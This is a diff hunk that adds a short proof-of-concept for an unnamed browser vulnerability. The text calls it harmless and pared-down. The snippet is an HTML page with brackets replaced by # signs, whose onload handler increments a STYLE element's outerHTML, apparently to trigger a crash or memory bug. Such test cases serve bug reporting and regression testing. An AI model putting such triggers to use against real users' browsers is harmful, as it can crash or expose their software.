@@ -1,0 +1,7 @@
+The following snippet is a pared-down, harmless proof-of-concept to
+illustrate the fundamental elements of the vulnerability.  &lt; and &gt;
+have been replaced by # to avoid setting off alarms.
+
+#!DOCTYPE#
+#STYLE#* { margin: 0; overflow: scroll }#/STYLE#
+#BODY ONLOAD=&quot;document.getElementsByTagName(&#039;STYLE&#039;)[0].outerHTML++&quot;#
